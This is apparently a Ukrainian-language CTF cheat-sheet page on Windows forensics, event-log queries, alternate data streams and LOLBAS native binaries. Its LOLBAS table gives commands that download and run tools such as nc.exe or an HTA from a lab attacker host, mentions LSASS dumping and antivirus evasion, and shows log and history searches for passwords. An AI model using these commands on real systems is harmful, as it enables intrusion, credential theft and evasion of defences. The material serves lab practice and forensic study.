# Windows: Forensics, Logs & LOLBAS

**Навіщо:** прапорець може бути в журналах/метаданих; у KotH треба бачити чужу активність; а native-утиліти (LOLBAS) дозволяють качати/виконувати/обходити без сторонніх бінарів.
**Коли:** прапорець не на диску явно; аналіз підозрілої активності; потрібен «живосильний» інструмент без заливки.
← [README](README.md) · [lateral: виявлення чужого](06-lateral-postex.md#6-виявлення-чужого-доступу--персистенції-koth-оборона-не-встановлення-своєї) · [cheatsheet](cheatsheet.md)

> Повна база native-бінарів з «нестандартним» застосуванням — **LOLBAS**: https://lolbas-project.github.io/. Нижче — найкорисніші в CTF.

---

## 1. Windows Event Logs
Журнали: `Security` (входи, 4624/4625), `System`, `Application`, `Microsoft-Windows-PowerShell/Operational`. Файли: `C:\Windows\System32\winevt\Logs\*.evtx`.
```powershell
# останні входи (успіх/невдача) — хто і звідки
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 20 |
  Select TimeCreated,@{n='User';e={$_.Properties[5].Value}},@{n='Src';e={$_.Properties[18].Value}}
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 20   # невдалі входи (брут?)
# створення процесів (якщо ввімкнено аудит 4688)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 30 |
  Select TimeCreated,@{n='Proc';e={$_.Properties[5].Value}}
# пошук за текстом у журналі (прапорець/команда в логах)
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  ? Message -match 'best|flag|password' | Select TimeCreated,Message
```
```cmd
:: з cmd (wevtutil)
wevtutil qe Security /c:20 /rd:true /f:text | findstr /i "4624 4625 Account"
```
**Інтерпретація:** серія 4625 з одного IP → брут; 4624 Logon Type 3 (мережевий)/10 (RDP) від незвичного юзера → чужий доступ. 4688/PowerShell-логи інколи містять командний рядок з паролем/прапорцем.
**Обмеження:** читання `Security` потребує адмін-прав; аудит 4688 часто вимкнений.

## 2. PowerShell logs окремо
- **ScriptBlock Logging** (EventID 4104 у `.../PowerShell/Operational`) записує виконаний PS-код — там бувають креди/прапорці, залишені адміном або суперником.
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 50 |
  Select -Expand Message | Select-String 'pass|secret|best|Invoke'
```
- PSReadLine history (per-user, без адмін-прав): `type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`.

## 3. Аналіз файлів / метаданих (прапорці в неявних місцях)
```powershell
# альтернативні потоки даних (ADS) — класичне місце схову
Get-Item C:\path\file.txt -Stream *            # є потік крім :$DATA?
Get-Content C:\path\file.txt -Stream hidden    # прочитати схований потік
gci C:\Users -Recurse -EA 0 | % { $_|Get-Item -Stream * -EA 0 } | ? Stream -ne ':$DATA'
# рядки/хеш/base64 у файлі
Select-String -Path C:\path\* -Pattern 'best|flag'
certutil -encode/-decode  # base64; certutil -hashfile file SHA256
# метадані (якщо є exiftool на Kali — забрати файл і прогнати там)
```
**Інтерпретація:** ADS (`file.txt:hidden`) — часто навмисний схов прапорця на Windows. `dir /r` показує ADS у cmd.
**Обмеження:** глибший аналіз (EXIF/стего/office-метадані) — простіше забрати файл на Kali ([file-transfer](../02-workflows/file-transfer.md)); повна forensics/stego-частина — окрема майбутня хвиля репо.

## 4. LOLBAS — native-бінари для операцій без сторонніх тулів
| Бінар | Застосування | Приклад |
|---|---|---|
| `certutil` | завантаження/ base64/ хеш | `certutil -urlcache -f http://10.8.N.x:8000/nc.exe nc.exe` |
| `bitsadmin` | завантаження | `bitsadmin /transfer j http://10.8.N.x:8000/x.exe C:\temp\x.exe` |
| `powershell iwr` | завантаження | `iwr http://10.8.N.x:8000/x.exe -OutFile x.exe` |
| `rundll32` | дамп LSASS / запуск | див. [credentials](04-credentials.md#lsass) |
| `mshta` | виконання HTA/скрипта | `mshta http://10.8.N.x:8000/x.hta` |
| `regsvr32` | виконання scriptlet | LOLBAS: Squiblydoo |
| `wmic` | запуск процесу/enum | `wmic process call create "cmd /c ..."` |
| `findstr` | grep без PS | `findstr /s /i best C:\*.txt` |
| `reg` | читання/запис реєстру | `reg query ... /s` |
| `schtasks` | таски (enum/виконання) | `schtasks /query /v` |
**Коли це потрібно:** AV ріже залиті `.exe`, або на цілі бідний набір — роби downloader/виконання штатним бінарем. LOLBAS-сторінка кожного бінаря дає точний синтаксис.

## 5. Корисні native-утиліти (orientation/analysis)
```cmd
driverquery                 :: драйвери (вразливі? BYOVD — рідко в CTF)
wmic product get name,version :: встановлений софт
fsutil fsinfo drives        :: диски
dir /r C:\path              :: показати ADS
icacls <file>               :: права
sc query / sc qc            :: сервіси
```

## Часті помилки
- Шукати прапорець лише у `.txt` і пропустити ADS (`dir /r`, `-Stream`).
- Намагатись читати `Security`-лог без адмін-прав (піде `Access denied`).
- Тягнути велику forensics на цілі замість того, щоб забрати файл на Kali.

## Джерела
- LOLBAS Project: https://lolbas-project.github.io/
- Microsoft — Get-WinEvent: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent
- Microsoft — wevtutil: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
- HackTricks — Basic forensic methodology / ADS: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/index.html
